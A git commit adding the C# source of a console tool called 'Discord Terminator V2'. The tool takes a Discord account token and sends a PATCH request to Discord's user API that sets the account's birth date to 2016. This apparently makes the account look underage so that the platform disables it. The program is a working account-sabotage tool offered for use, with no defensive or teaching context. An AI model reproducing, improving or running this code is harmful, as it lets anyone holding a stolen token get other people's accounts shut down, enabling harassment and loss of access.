5fb6755942a5aebbc38c519d13438c3768070227
Yaekith <47884923+Yaekith@users.noreply.github.com>
2020-05-02 18:50:49 +0800

    Source code

---
+++ ClientExtensions.cs
@@ -0,0 +1,32 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Net.Http;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace DiscordTerminatorV2
+{
+    public static class ClientExtensions
+    {
+        public static async Task<HttpResponseMessage> PatchAsync(this HttpClient client, string url, HttpContent iContent)
+        {
+            var method = new HttpMethod("PATCH");
+
+            var request = new HttpRequestMessage(method, new Uri(url))
+            {
+                Content = iContent
+            };
+
+            HttpResponseMessage response = new HttpResponseMessage();
+
+            try
+            {
+                response = await client.SendAsync(request);
+            }
+            catch (TaskCanceledException) { }
+
+            return response;
+        }
+    }
+}
---
+++ Program.cs
@@ -0,0 +1,37 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Net.Http;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace DiscordTerminatorV2
+{
+    class Program
+    {
+        static bool DisableAccount(string token)
+        {
+            HttpClient client = new HttpClient();
+            client.DefaultRequestHeaders.Add("Authorization", token);
+
+            var response = client.PatchAsync("https://discordapp.com/api/v6/users/@me", new StringContent("{\"date_of_birth\":\"2016-2-14\"}"));
+
+            return response.Result.StatusCode == System.Net.HttpStatusCode.OK;
+        }
+        static void Main(string[] args)
+        {
+            Console.Title = "Discord Terminator V2";
+            Console.WriteLine("Enter Token: ");
+            string token = Console.ReadLine();
+            if (DisableAccount(token) == true)
+            {
+                Console.WriteLine("Successfully disabled that account.");
+            }
+            else
+            {
+                Console.WriteLine("An error occurred while disabling that account, are you sure it's a valid token?");
+            }
+            Console.ReadLine();
+        }
+    }
+}
